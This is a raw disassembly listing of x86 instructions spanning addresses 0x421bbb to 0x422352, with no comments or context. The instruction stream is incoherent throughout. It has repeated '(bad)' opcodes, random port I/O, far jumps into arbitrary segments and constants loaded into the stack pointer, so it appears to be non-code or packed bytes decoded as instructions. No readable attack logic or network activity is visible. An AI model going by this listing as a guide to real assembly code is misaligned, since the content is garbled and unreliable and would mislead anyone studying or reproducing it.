  421bbb:	fcmovnbe st,st(5)
  421bbd:	loope  0x421b74
  421bbf:	loop   0x421bd1
  421bc1:	loop   0x421bf0
  421bc3:	enter  0xce10,0xae
  421bc7:	stc    
  421bc8:	mov    esp,0x13bc6f61
  421bcd:	push   0xffffffd0
  421bcf:	push   edx
  421bd0:	pushf  
  421bd1:	pop    edi
  421bd2:	mov    ds:0xabb272,al
  421bd7:	aaa    
  421bd8:	in     al,dx
  421bd9:	xchg   esi,eax
  421bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bdb:	retf   
  421bdc:	(bad)  
  421bdd:	clc    
  421bde:	ins    DWORD PTR es:[edi],dx
  421bdf:	out    0xaf,al
  421be1:	cld    
  421be2:	into   
  421be3:	mov    ah,0x52
  421be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	cmp    DWORD PTR [ebp+0x5d],esp
  421bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421beb:	mov    bh,0xa3
  421bed:	mov    cs:0xd7da33a3,al
  421bf3:	or     bl,cl
  421bf5:	xor    eax,DWORD PTR [esp+ebp*8]
  421bf8:	sub    eax,0x6ff18bed
  421bfd:	data16 sti 
  421bff:	inc    ecx
  421c00:	ror    BYTE PTR [edi+esi*4],0x72
  421c04:	mov    bl,0x0
  421c06:	xchg   ecx,eax
  421c07:	jg     0x421c4c
  421c09:	xor    BYTE PTR [edi+0x6cfdaf6d],cl
  421c0f:	imul   esi,edx,0xffffffc2
  421c12:	popa   
  421c13:	or     eax,0x5146ac3d
  421c18:	call   0xebc9:0xea6fa61c
  421c1f:	outs   dx,DWORD PTR ds:[esi]
  421c20:	mov    al,0x9d
  421c22:	xchg   ebx,eax
  421c23:	call   0x7e3fbe54
  421c28:	push   ss
  421c29:	cmp    esp,DWORD PTR ds:0x4f20b93f
  421c2f:	sub    BYTE PTR [eax+0x6dcb435f],0x5f
  421c36:	inc    ecx
  421c37:	jle    0x421ca5
  421c39:	cmp    al,0xe6
  421c3b:	jl     0x421c3f
  421c3d:	outs   dx,BYTE PTR ds:[esi]
  421c3e:	xchg   DWORD PTR [esi+0x5f8f4095],esi
  421c44:	adc    al,0x5b
  421c46:	rcl    bl,cl
  421c48:	daa    
  421c49:	xchg   BYTE PTR [edi+0x12],ch
  421c4c:	mov    esp,0xb77c2a81
  421c51:	dec    esi
  421c52:	mov    eax,0xdade6b13
  421c57:	push   cs
  421c58:	inc    esi
  421c59:	pop    eax
  421c5a:	sbb    ah,0xb2
  421c5d:	mov    bh,0x85
  421c5f:	xchg   BYTE PTR [esi+0x54],dl
  421c62:	mov    bl,0x4a
  421c64:	in     eax,dx
  421c65:	in     eax,dx
  421c66:	rcr    BYTE PTR [ebx],0xc8
  421c69:	retf   
  421c6a:	cmp    al,0xeb
  421c6c:	push   ds
  421c6d:	mov    ebx,DWORD PTR [edx-0x5af01b22]
  421c73:	jo     0x421c3e
  421c75:	(bad)  
  421c76:	jne    0x421ca9
  421c78:	and    eax,0x9dcea888
  421c7d:	in     eax,dx
  421c7e:	bound  ecx,QWORD PTR [esi]
  421c80:	push   ds
  421c81:	pop    ebx
  421c82:	in     eax,0x0
  421c84:	cmp    DWORD PTR [edx+0x28],edi
  421c87:	mov    edx,0xb941391e
  421c8c:	scas   al,BYTE PTR es:[edi]
  421c8d:	into   
  421c8e:	sub    ch,ah
  421c90:	xchg   esi,eax
  421c91:	std    
  421c92:	(bad)
  421c96:	jg     0x421cab
  421c98:	push   0x6f943a20
  421c9d:	ins    BYTE PTR es:[edi],dx
  421c9e:	mov    ebp,DWORD PTR [edi]
  421ca0:	and    BYTE PTR [ecx],bh
  421ca2:	outs   dx,BYTE PTR ds:[esi]
  421ca3:	sti    
  421ca4:	push   ds
  421ca5:	jne    0x421c5f
  421ca7:	imul   edx,DWORD PTR [edi]
  421caa:	fcmovbe st,st(2)
  421cac:	jmp    0x9c862c29
  421cb1:	ror    BYTE PTR [ebx-0x48743b2a],1
  421cb7:	mov    dl,0x83
  421cb9:	jmp    0x421cae
  421cbb:	jmp    0x315:0x887ed196
  421cc2:	ins    BYTE PTR es:[edi],dx
  421cc3:	push   esi
  421cc4:	adc    eax,0x9d486b12
  421cc9:	sbb    DWORD PTR [ebx],ebx
  421ccb:	repnz cmp dl,bh
  421cce:	inc    esp
  421ccf:	addr16 call 0x3447:0x3fe2aacf
  421cd7:	ret    
  421cd8:	pop    ds
  421cd9:	call   0x234:0xf04f03f6
  421ce0:	dec    edi
  421ce1:	lahf   
  421ce2:	scas   al,BYTE PTR es:[edi]
  421ce3:	push   0xe
  421ce5:	nop
  421ce6:	add    dh,BYTE PTR [ebp-0x53]
  421ce9:	data16 ins BYTE PTR es:[edi],dx
  421ceb:	sbb    DWORD PTR ds:0x9905bc0f,ebx
  421cf1:	dec    edi
  421cf2:	call   0x411ce53a
  421cf7:	jo     0x421ca2
  421cf9:	sub    al,BYTE PTR [ecx+0x75]
  421cfc:	imul   ebp,DWORD PTR [edi],0xffffff91
  421cff:	adc    ecx,esi
  421d01:	(bad)  
  421d02:	cli    
  421d03:	pop    ds
  421d04:	(bad)  
  421d05:	cli    
  421d06:	ins    BYTE PTR es:[edi],dx
  421d07:	(bad)  
  421d08:	repnz (bad) 
  421d0a:	cmp    ecx,DWORD PTR [ebp+0x3931fd97]
  421d10:	jle    0x421d6f
  421d12:	jle    0x421cd0
  421d14:	cmp    al,0x7c
  421d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d17:	jb     0x421d14
  421d19:	cmp    al,0x1b
  421d1b:	dec    ecx
  421d1c:	loop   0x421cea
  421d1e:	or     al,BYTE PTR [edi-0x7d5629]
  421d24:	sbb    eax,0xd370242c
  421d29:	mov    WORD PTR [edi+0x2f],?
  421d2c:	xchg   edi,eax
  421d2d:	inc    eax
  421d2e:	push   esi
  421d2f:	mov    edx,0xed139280
  421d34:	lahf   
  421d35:	in     al,0xed
  421d37:	xchg   ebp,eax
  421d38:	(bad)
  421d3c:	test   eax,0x5202a3d3
  421d41:	fdivr  QWORD PTR [ecx+0x25829638]
  421d47:	jo     0x421d3b
  421d49:	imul   esp,DWORD PTR [esi],0x7d7c04ec
  421d4f:	pop    esi
  421d50:	mov    esp,0x8b552d40
  421d55:	das    
  421d56:	adc    esi,ecx
  421d58:	and    al,0x66
  421d5a:	fiadd  WORD PTR [eax+ebp*2]
  421d5d:	adc    al,0x7e
  421d5f:	jbe    0x421ddc
  421d61:	(bad)  
  421d62:	cmp    eax,0x2dff10c2
  421d67:	xchg   ebx,eax
  421d68:	and    eax,0xa0b5bf9c
  421d6d:	inc    ecx
  421d6e:	sbb    edx,DWORD PTR [ecx-0x660f47af]
  421d74:	or     DWORD PTR [esi],0xa7e1b37c
  421d7a:	sub    al,BYTE PTR [ebx+0x63]
  421d7d:	je     0x421d82
  421d7f:	fidivr WORD PTR [edx]
  421d81:	shl    BYTE PTR [esp+edx*1-0x2a],1
  421d85:	xchg   ecx,eax
  421d86:	mov    ds:0xc3ed6ba5,al
  421d8b:	fsubr  QWORD PTR [esi+0x62]
  421d8e:	sbb    al,0xf9
  421d90:	xor    edi,DWORD PTR [ecx]
  421d92:	out    dx,al
  421d93:	outs   dx,DWORD PTR ds:[esi]
  421d94:	jmp    0x9d2d1427
  421d99:	or     eax,DWORD PTR [ebp-0x70674d46]
  421d9f:	adc    bl,al
  421da1:	retf   
  421da2:	inc    edi
  421da3:	pop    DWORD PTR [esi+0x77]
  421da6:	sub    dl,bl
  421da8:	jmp    0x5742:0x392e54f9
  421daf:	adc    BYTE PTR [edx],bl
  421db1:	and    bh,BYTE PTR [ebp-0x2e16f576]
  421db7:	add    bl,BYTE PTR [edi+0x5a]
  421dba:	jge    0x421d7d
  421dbc:	jmp    0x421d89
  421dbe:	loop   0x421d7f
  421dc0:	ja     0x421d73
  421dc2:	mov    ebp,0xc6771c81
  421dc7:	nop
  421dc8:	addr16 sub eax,0x3c276501
  421dce:	inc    ebp
  421dcf:	stc    
  421dd0:	mov    dl,0x6d
  421dd2:	add    ah,BYTE PTR [eax-0x403b72a5]
  421dd8:	dec    esi
  421dd9:	outs   dx,BYTE PTR ds:[esi]
  421dda:	pop    ss
  421ddb:	shr    DWORD PTR [edi],cl
  421ddd:	rcl    DWORD PTR [ebx+0x330046d3],1
  421de3:	out    dx,eax
  421de4:	fimul  WORD PTR [edx-0x17]
  421de7:	dec    ecx
  421de8:	sar    BYTE PTR [edi-0x2bccfd0],0x2f
  421def:	sub    DWORD PTR [ecx-0x6859c690],eax
  421df5:	add    ch,dh
  421df7:	mov    al,ds:0x705282ec
  421dfc:	pop    edx
  421dfd:	mov    esp,0xfce82fcc
  421e02:	jle    0x421e6e
  421e04:	sub    ebp,DWORD PTR [edx-0x459840a0]
  421e0a:	lea    esp,[ecx+0x11]
  421e0d:	cli    
  421e0e:	test   al,0x40
  421e10:	jb     0x421dec
  421e12:	or     eax,0xd5e28129
  421e17:	mov    ah,0xbb
  421e19:	push   edi
  421e1a:	mov    ebp,0x40625ae5
  421e1f:	inc    esi
  421e20:	test   DWORD PTR [edi-0x62b6a59f],eax
  421e26:	retf   0x5de
  421e29:	std    
  421e2a:	jmp    0x16fd9a8f
  421e2f:	adc    ah,BYTE PTR [esi]
  421e31:	fwait
  421e32:	retf   
  421e33:	mov    eax,0xf5e74951
  421e38:	sub    edi,esp
  421e3a:	mov    WORD PTR [esi-0x3f],?
  421e3d:	ja     0x421ded
  421e3f:	(bad)  
  421e40:	mov    esi,0x2a95311a
  421e45:	xchg   esi,eax
  421e46:	add    BYTE PTR [edx+0x4f],0x96
  421e4a:	fsubr  st(1),st
  421e4c:	fisubr DWORD PTR [edx-0x73]
  421e4f:	iret   
  421e50:	enter  0xd431,0x4d
  421e54:	loopne 0x421eb0
  421e56:	retf   
  421e57:	cld    
  421e58:	sub    eax,0x343dcae5
  421e5d:	sub    BYTE PTR [ebx-0x77],bh
  421e60:	mov    ebx,0xced3cafa
  421e65:	out    0x7a,al
  421e67:	push   edx
  421e68:	xchg   ecx,eax
  421e69:	aaa    
  421e6a:	(bad)  
  421e6b:	sti    
  421e6c:	pop    ss
  421e6d:	dec    esi
  421e6e:	mov    ah,0x70
  421e70:	push   ecx
  421e71:	jmp    0x675d627f
  421e76:	sar    BYTE PTR [eax+0x41],cl
  421e79:	mov    edx,0xa8e54ef5
  421e7e:	mov    ebx,0x318379a3
  421e83:	aam    0xe4
  421e85:	punpckhbw mm2,QWORD PTR [esi+0x6b5dc548]
  421e8c:	std    
  421e8d:	popw   ds
  421e8f:	push   edi
  421e90:	loop   0x421e6b
  421e92:	sti    
  421e93:	popa   
  421e94:	add    DWORD PTR [ebp-0x19],esi
  421e97:	push   esi
  421e98:	(bad)  
  421e99:	sbb    al,0x72
  421e9b:	mov    bl,0x9f
  421e9d:	mov    WORD PTR [ebx],ds
  421e9f:	jp     0x421e9a
  421ea1:	mov    al,ds:0x60555e54
  421ea6:	dec    ecx
  421ea7:	aaa    
  421ea8:	sbb    al,0xcb
  421eaa:	mov    cl,0x6b
  421eac:	es leave 
  421eae:	mov    al,ds:0x8988058a
  421eb3:	mov    BYTE PTR [eax-0x164656b4],ch
  421eb9:	(bad)  
  421eba:	mov    edi,eax
  421ebc:	jle    0x421f21
  421ebe:	bsf    eax,edx
  421ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ec2:	xor    al,0xc
  421ec4:	scas   al,BYTE PTR es:[edi]
  421ec5:	mov    edi,0x7e0e6782
  421eca:	mov    ebp,0xb808a1e0
  421ecf:	or     eax,0x36462844
  421ed4:	adc    BYTE PTR [edx+0x7d],ch
  421ed7:	mov    edx,DWORD PTR [ecx+edx*8-0x1da4798]
  421ede:	in     eax,dx
  421edf:	scas   al,BYTE PTR es:[edi]
  421ee0:	loope  0x421f05
  421ee2:	neg    ebx
  421ee4:	retf   0xb5ca
  421ee7:	dec    esp
  421ee8:	cmp    eax,0x234e96e2
  421eed:	bound  edx,QWORD PTR [ebp+0x68ef2d5f]
  421ef3:	adc    ebx,DWORD PTR [ebx]
  421ef5:	jmp    0x421ed7
  421ef7:	ficomp DWORD PTR [ecx+0x78]
  421efa:	lahf   
  421efb:	jp     0x421eb6
  421efd:	daa    
  421efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421eff:	adc    al,0x86
  421f01:	test   al,0x16
  421f03:	mov    WORD PTR [esi],ss
  421f05:	and    esp,ebp
  421f07:	inc    edi
  421f08:	in     eax,dx
  421f09:	fs push 0x6b7664bc
  421f0f:	fsin   
  421f11:	clc    
  421f12:	test   ecx,0x27d02707
  421f18:	(bad)  
  421f19:	fld    QWORD PTR [eax+0x59]
  421f1c:	and    DWORD PTR [ebx],0x40
  421f1f:	outs   dx,BYTE PTR ds:[esi]
  421f20:	clc    
  421f21:	lods   al,BYTE PTR ds:[esi]
  421f22:	add    ecx,DWORD PTR [ebp-0x17]
  421f25:	or     al,0x65
  421f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f28:	(bad)  
  421f29:	and    ebp,ebp
  421f2b:	xor    BYTE PTR [eax+0x79ccbbf7],bh
  421f31:	je     0x421f04
  421f33:	adc    edx,ebx
  421f35:	neg    dl
  421f37:	dec    ebp
  421f38:	or     al,0xa0
  421f3a:	(bad)
  421f3e:	pusha  
  421f3f:	retf   
  421f40:	inc    edx
  421f41:	cmp    bl,ah
  421f43:	xchg   esp,eax
  421f44:	dec    eax
  421f45:	data16 stos BYTE PTR es:[edi],al
  421f47:	mov    esi,0xd818afdb
  421f4c:	cmp    BYTE PTR [ebp-0x7fdd27a1],0xf9
  421f53:	in     eax,dx
  421f54:	xor    BYTE PTR [eax],ah
  421f56:	cmovp  esp,eax
  421f59:	and    ch,BYTE PTR [ebp-0x498daa47]
  421f5f:	aad    0x28
  421f61:	loopne 0x421f23
  421f63:	es dec ebp
  421f65:	inc    edi
  421f66:	jmp    0xf418:0xf328dae3
  421f6d:	pop    ds
  421f6e:	stc    
  421f6f:	stc    
  421f70:	add    DWORD PTR [ebx-0x3a9fbcad],ebx
  421f76:	popf   
  421f77:	pop    ebp
  421f78:	loopne 0x421f61
  421f7a:	and    al,0x15
  421f7c:	add    bl,BYTE PTR [ecx-0x3e6b96f6]
  421f82:	sti    
  421f83:	addr16 loopne 0x421f72
  421f86:	push   ebx
  421f87:	fwait
  421f88:	stos   BYTE PTR es:[edi],al
  421f89:	push   cs
  421f8a:	aaa    
  421f8b:	scas   al,BYTE PTR es:[edi]
  421f8c:	(bad)  [ebp+0x3e6fee9f]
  421f92:	bnd jl 0x421f28
  421f95:	push   edx
  421f96:	das    
  421f97:	in     eax,dx
  421f98:	sub    esp,0x7f
  421f9b:	mov    edi,0x84cecdbb
  421fa0:	call   0x95ac:0x419c2f94
  421fa7:	into   
  421fa8:	and    esi,ebx
  421faa:	sub    DWORD PTR [edx],edx
  421fac:	stos   BYTE PTR es:[edi],al
  421fad:	pop    es
  421fae:	mov    al,ds:0x7980649d
  421fb3:	inc    ecx
  421fb4:	sbb    ax,0x71b3
  421fb8:	push   0xffffffa4
  421fba:	xor    BYTE PTR [ebp-0x3927081c],al
  421fc0:	in     al,0xf1
  421fc2:	xchg   ecx,eax
  421fc3:	pusha  
  421fc4:	fist   WORD PTR [ebp+0x55]
  421fc7:	imul   BYTE PTR gs:[ebx+eiz*8]
  421fcb:	pop    ds
  421fcc:	repz adc DWORD PTR [ebx-0x326e3011],ecx
  421fd3:	repnz dec esp
  421fd5:	xchg   ebp,eax
  421fd6:	pop    es
  421fd7:	ror    esi,cl
  421fd9:	test   al,0x38
  421fdb:	(bad)  
  421fdc:	stc    
  421fdd:	mov    dl,0x78
  421fdf:	out    dx,al
  421fe0:	test   BYTE PTR [edx],ah
  421fe2:	xor    edi,ebx
  421fe4:	cmp    eax,0x7ba93867
  421fe9:	pop    es
  421fea:	(bad)  
  421feb:	loop   0x42201f
  421fed:	sbb    eax,0xcfd3762c
  421ff2:	fld    TBYTE PTR [ecx+0x70742aca]
  421ff8:	ds push edi
  421ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ffb:	mov    gs,WORD PTR [esi+0x50]
  421ffe:	and    ch,BYTE PTR [ebx+0x1b]
  422001:	cmp    ebx,DWORD PTR ds:0x6f372a94
  422007:	out    0xb1,al
  422009:	in     eax,dx
  42200a:	add    bl,cl
  42200c:	cmp    DWORD PTR [eax],edi
  42200e:	push   ecx
  42200f:	mov    BYTE PTR [esi+0x32],0x40
  422013:	push   ecx
  422014:	lds    ebx,FWORD PTR [eax]
  422016:	(bad)  
  422017:	outs   dx,DWORD PTR ds:[esi]
  422018:	std    
  422019:	jno    0x421fab
  42201b:	push   0xffffffd9
  42201d:	inc    esp
  42201e:	in     eax,0x21
  422020:	cmp    al,0x73
  422022:	pop    edx
  422023:	mov    bh,0x3e
  422025:	and    ch,BYTE PTR [edx+0x57abdf88]
  42202b:	loop   0x422084
  42202d:	(bad)  
  42202e:	out    0xdd,al
  422030:	out    0xa4,al
  422032:	setnp  BYTE PTR [esi]
  422035:	dec    eax
  422036:	adc    al,0xc4
  422038:	dec    esi
  422039:	jmp    0xc91b1fd8
  42203e:	xor    edi,edi
  422040:	clc    
  422041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422042:	out    0x44,al
  422044:	leave  
  422045:	cmp    al,0xa1
  422047:	fsub   DWORD PTR ds:0xcef3d3e0
  42204d:	push   0xffd46533
  422052:	lods   al,BYTE PTR ds:[esi]
  422053:	mov    ah,cl
  422055:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  422057:	std    
  422058:	test   al,al
  42205a:	ror    ebp,1
  42205c:	in     al,0x89
  42205e:	xor    esi,ebx
  422060:	(bad)  
  422061:	jg     0x422004
  422063:	call   FWORD PTR [eax+ecx*2-0x3f]
  422067:	adc    BYTE PTR [esi],bl
  422069:	stc    
  42206a:	int3   
  42206b:	xor    eax,0x401e607f
  422070:	popf   
  422071:	je     0x42208e
  422073:	sar    esi,cl
  422075:	jp     0x42208d
  422077:	jle    0x422053
  422079:	xchg   BYTE PTR [edi-0x65de82ca],al
  42207f:	jnp    0x42204f
  422081:	lock pop eax
  422083:	fisttp QWORD PTR [ebp+0xd]
  422086:	sbb    dl,ch
  422088:	sub    bh,BYTE PTR [eax+0x7f]
  42208b:	(bad)  
  42208d:	add    eax,0xbdf1c072
  422092:	push   es
  422093:	xor    cl,dl
  422095:	cmc    
  422096:	xlat   BYTE PTR ds:[ebx]
  422097:	xor    esp,DWORD PTR [esi]
  422099:	sbb    BYTE PTR [ecx+ecx*4+0xb],bl
  42209d:	lds    ecx,FWORD PTR [ecx-0x7a]
  4220a0:	pop    edx
  4220a1:	and    DWORD PTR [edx+0x49b064a7],ecx
  4220a7:	arpl   bx,bx
  4220a9:	pop    esi
  4220aa:	std    
  4220ab:	xor    DWORD PTR [edi],0xdfc4e402
  4220b1:	fstp   TBYTE PTR ds:[edi]
  4220b4:	fcomp  st(1)
  4220b6:	xchg   edi,eax
  4220b7:	mov    cl,0x37
  4220b9:	mul    DWORD PTR [edi]
  4220bb:	data16 arpl WORD PTR [edi+0x56],sp
  4220bf:	(bad)  
  4220c0:	(bad)
  4220c3:	fst    QWORD PTR [ebx-0x47]
  4220c6:	pop    edx
  4220c7:	jno    0x422069
  4220c9:	scas   al,BYTE PTR es:[edi]
  4220ca:	xchg   esi,eax
  4220cb:	push   edi
  4220cc:	inc    ebp
  4220cd:	or     BYTE PTR ds:0xaadda4b7,dl
  4220d3:	sub    DWORD PTR [ebp+0x7a],esp
  4220d6:	or     BYTE PTR [esi-0x6d],ch
  4220d9:	shl    DWORD PTR [ecx],1
  4220db:	mov    WORD PTR [ecx+0x62],?
  4220de:	adc    al,0xf1
  4220e0:	cmp    ah,cl
  4220e2:	sahf   
  4220e3:	jl     0x4220fd
  4220e5:	jg     0x422140
  4220e7:	inc    eax
  4220e8:	popf   
  4220e9:	sbb    eax,0xebeadf59
  4220ee:	dec    edx
  4220ef:	mov    dh,0x8
  4220f1:	popa   
  4220f2:	outs   dx,DWORD PTR ds:[esi]
  4220f3:	xchg   edx,eax
  4220f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f5:	mov    edi,DWORD PTR [ecx-0x1f]
  4220f8:	cmp    BYTE PTR [eax+0x7b9f9513],bl
  4220fe:	push   es
  4220ff:	fs xchg edx,eax
  422101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422102:	mov    ds:0x334ae992,eax
  422107:	pop    eax
  422108:	mov    ch,0xae
  42210a:	(bad)  
  42210b:	dec    ebp
  42210c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42210d:	ja     0x422158
  42210f:	sar    WORD PTR [esi+0x292cea64],1
  422116:	out    dx,eax
  422117:	xchg   edx,eax
  422118:	mov    BYTE PTR [edx-0x43],ch
  42211b:	add    eax,0xc5106191
  422120:	pop    ecx
  422121:	mov    dh,0xe6
  422123:	dec    edx
  422124:	mov    dl,0xc0
  422126:	stc    
  422127:	xchg   esp,eax
  422128:	dec    ebx
  422129:	out    dx,al
  42212a:	inc    ebp
  42212b:	rol    BYTE PTR [ebx+edx*1],cl
  42212e:	cmp    ah,BYTE PTR [ebx+0x38]
  422131:	bound  esp,QWORD PTR ds:0xd397a09d
  422137:	jp     0x4220f1
  422139:	out    dx,eax
  42213a:	(bad)  
  42213b:	(bad)  
  42213c:	fiadd  WORD PTR [ecx-0x43]
  42213f:	mov    eax,0x4cdeaaeb
  422144:	sub    BYTE PTR [edi+0x1c],ch
  422147:	xor    DWORD PTR [ebp-0x41],esp
  42214a:	enter  0x4c,0xa4
  42214e:	icebp  
  42214f:	mov    al,ds:0xfd816495
  422154:	idiv   BYTE PTR ds:0xa3596213
  42215a:	aaa    
  42215b:	push   ds
  42215c:	push   0x19907d4a
  422161:	inc    edi
  422162:	adc    esp,DWORD PTR [ecx-0x66]
  422165:	mov    edi,0xd21ec7c
  42216a:	jae    0x4221bd
  42216c:	jmp    0xdf3aebdb
  422171:	out    0x1e,eax
  422173:	jmp    0x4221d6
  422175:	sub    esp,eax
  422177:	jbe    0x422138
  422179:	dec    esp
  42217a:	out    dx,eax
  42217b:	pusha  
  42217c:	dec    ebp
  42217d:	in     eax,dx
  42217e:	dec    ebp
  42217f:	sbb    eax,0x541479a3
  422184:	in     al,dx
  422185:	and    DWORD PTR [edi],ebp
  422187:	push   ss
  422188:	test   BYTE PTR [ebx],dh
  42218a:	retf   
  42218b:	jge    0x422143
  42218d:	inc    esp
  42218e:	mov    eax,ds:0x59f5519b
  422193:	outs   dx,DWORD PTR ds:[esi]
  422194:	mov    edi,esp
  422196:	jbe    0x4221e4
  422198:	pop    edx
  422199:	js     0x4221e2
  42219b:	add    eax,0xc2663deb
  4221a0:	loopne 0x42219c
  4221a2:	(bad)  
  4221a3:	jne    0x4221e7
  4221a5:	lock add ecx,DWORD PTR [edx]
  4221a8:	loop   0x4221fa
  4221aa:	call   0x676a903
  4221af:	or     eax,DWORD PTR [esi-0x3b730e0e]
  4221b5:	jo     0x422205
  4221b7:	ds das 
  4221b9:	dec    eax
  4221ba:	dec    eax
  4221bb:	lds    ebp,FWORD PTR [esi]
  4221bd:	jne    0x42215f
  4221bf:	out    0xb0,eax
  4221c1:	in     eax,dx
  4221c2:	jo     0x4221b5
  4221c4:	pop    esp
  4221c5:	sbb    BYTE PTR [ebx*8+0x21fbe014],ch
  4221cc:	or     esp,esp
  4221ce:	add    bl,cl
  4221d0:	mov    ebx,0xd814b7c7
  4221d5:	xchg   ebx,eax
  4221d6:	bound  ebp,QWORD PTR [ebx+ebp*4+0x55]
  4221da:	or     eax,0xedb97bc4
  4221df:	adc    BYTE PTR [eax],dh
  4221e1:	jbe    0x422173
  4221e3:	in     eax,dx
  4221e4:	test   DWORD PTR [ecx],ebp
  4221e6:	inc    ebx
  4221e7:	pop    es
  4221e8:	dec    ebx
  4221e9:	pop    ds
  4221ea:	pushf  
  4221eb:	jge    0x422232
  4221ed:	in     al,dx
  4221ee:	rep outs dx,DWORD PTR ds:[esi]
  4221f0:	scas   al,BYTE PTR es:[edi]
  4221f1:	ss (bad) 
  4221f3:	popa   
  4221f4:	inc    ecx
  4221f5:	in     al,dx
  4221f6:	pop    ebx
  4221f7:	(bad)  
  4221f8:	aam    0xe6
  4221fa:	ss js  0x422230
  4221fd:	lods   al,BYTE PTR ds:[esi]
  4221fe:	(bad)  
  4221ff:	aas    
  422200:	mov    ebx,0x905e5a69
  422205:	jge    0x42218d
  422207:	pop    ds
  422208:	dec    esp
  422209:	jno    0x422194
  42220b:	xchg   edx,eax
  42220c:	(bad)  
  42220d:	push   cs
  42220e:	fbstp  TBYTE PTR [bx+di]
  422211:	fiadd  WORD PTR [edx]
  422213:	loop   0x42221b
  422215:	jle    0x4221f3
  422217:	(bad)  [ecx-0x1abb11a6]
  42221d:	adc    edi,ebx
  42221f:	mov    ebx,0xb0b9bc54
  422224:	xor    bl,bh
  422226:	mov    es,WORD PTR [ecx+edi*1+0x3c]
  42222a:	xor    ecx,DWORD PTR [edi]
  42222c:	cmp    DWORD PTR [esi],ebx
  42222e:	test   DWORD PTR [eax+0xa],esp
  422231:	jb     0x422229
  422233:	add    eax,0x98c21ba4
  422238:	mov    ebx,0x78a276e9
  42223d:	or     ah,ch
  42223f:	mov    ds:0x8792be3c,al
  422244:	into   
  422245:	jbe    0x422284
  422247:	fisttp WORD PTR [eax+esi*8+0x4573e5e1]
  42224e:	sub    eax,0xb0281ee5
  422253:	in     al,dx
  422254:	sub    eax,0xef572459
  422259:	mov    bh,0x3f
  42225b:	xchg   edi,eax
  42225c:	cli    
  42225d:	cs and ah,ah
  422260:	lea    esp,[esi+0x26]
  422263:	punpckhwd mm3,QWORD PTR [esi]
  422266:	cdq    
  422267:	test   edx,edx
  422269:	inc    esi
  42226a:	outs   dx,DWORD PTR ds:[esi]
  42226b:	cmp    DWORD PTR [esi+0x4fee7cc2],ecx
  422271:	mov    ?,eax
  422273:	(bad)  
  422274:	dec    BYTE PTR [ecx-0x1407fd09]
  42227a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42227b:	or     eax,0x966cbdfe
  422280:	stc    
  422281:	cmp    esi,DWORD PTR [esi+0x4de687e8]
  422287:	cmc    
  422288:	arpl   WORD PTR [esi],bx
  42228a:	rcr    DWORD PTR [eax+0x7b07fb58],0x1c
  422291:	xchg   DWORD PTR [esi],esp
  422293:	jb     0x422284
  422295:	xlat   BYTE PTR ds:[ebx]
  422296:	ins    DWORD PTR es:[edi],dx
  422297:	loope  0x422294
  422299:	(bad)  
  42229a:	repz cmp BYTE PTR [eax+0x69cb6104],ch
  4222a1:	nop
  4222a2:	mov    eax,ds:0xc46275d6
  4222a7:	and    BYTE PTR [ebx],al
  4222a9:	inc    esp
  4222aa:	fwait
  4222ab:	push   0x37ec171e
  4222b0:	neg    bh
  4222b2:	push   ds
  4222b3:	ds inc eax
  4222b5:	mov    al,0x16
  4222b7:	in     eax,0x58
  4222b9:	jb     0x422333
  4222bb:	ds (bad) 
  4222bd:	sti    
  4222be:	mov    al,0xf
  4222c0:	push   0x2f
  4222c2:	cmp    edx,DWORD PTR [ebp-0x11d6b768]
  4222c8:	dec    ebp
  4222c9:	adc    DWORD PTR [ecx-0x676f0958],eax
  4222cf:	pop    edx
  4222d0:	scas   al,BYTE PTR es:[edi]
  4222d1:	stc    
  4222d2:	lahf   
  4222d3:	push   ecx
  4222d4:	test   BYTE PTR [esi-0x5b],bl
  4222d7:	jle    0x422339
  4222d9:	push   0xdcd3d465
  4222de:	add    al,0xad
  4222e0:	cmp    bh,ah
  4222e2:	ins    BYTE PTR es:[edi],dx
  4222e3:	out    dx,al
  4222e4:	mov    bl,0xd3
  4222e6:	mov    bh,0xad
  4222e8:	inc    esi
  4222e9:	mov    esi,0xfb275936
  4222ee:	cmp    bh,BYTE PTR [edi]
  4222f0:	mov    esi,0x752eeb3d
  4222f5:	and    al,0xa5
  4222f7:	pop    edi
  4222f8:	mov    ch,BYTE PTR [edx-0x45]
  4222fb:	dec    eax
  4222fc:	ror    BYTE PTR [ebx],cl
  4222fe:	jecxz  0x4222be
  422300:	aas    
  422301:	jge    0x42237c
  422303:	add    BYTE PTR [ecx],dl
  422305:	push   ss
  422306:	xor    eax,0xf3a9e49a
  42230b:	clc    
  42230c:	out    dx,eax
  42230d:	dec    ecx
  42230e:	adc    DWORD PTR [ecx+0x17],ebx
  422311:	nop
  422312:	imul   ebx,edx,0xf4ca1f91
  422318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422319:	jg     0x4222ee
  42231b:	mov    al,ds:0xac869367
  422320:	cmp    al,0xec
  422322:	adc    edx,DWORD PTR [edi+0x31]
  422325:	jge    0x42239e
  422327:	das    
  422328:	xchg   esp,eax
  422329:	mov    WORD PTR [edx+0x2022d1d8],es
  42232f:	add    DWORD PTR [ebx],ecx
  422331:	add    DWORD PTR [edx],edx
  422333:	dec    ebx
  422334:	loop   0x422302
  422336:	jbe    0x4222e5
  422338:	sti    
  422339:	ficomp WORD PTR [eax+0x3cbb4d6b]
  42233f:	scas   al,BYTE PTR es:[edi]
  422340:	sbb    al,0x74
  422342:	out    dx,eax
  422343:	xor    eax,DWORD PTR [edi-0x13]
  422346:	pop    eax
  422347:	mov    al,0x76
  422349:	jp     0x422301
  42234b:	adc    BYTE PTR [edx],0xa5
  42234e:	cld    
  42234f:	fmul   QWORD PTR [ebp-0x61]
  422352:	test   DWORD PTR [ebp+0x4d798c94],0x9329d329
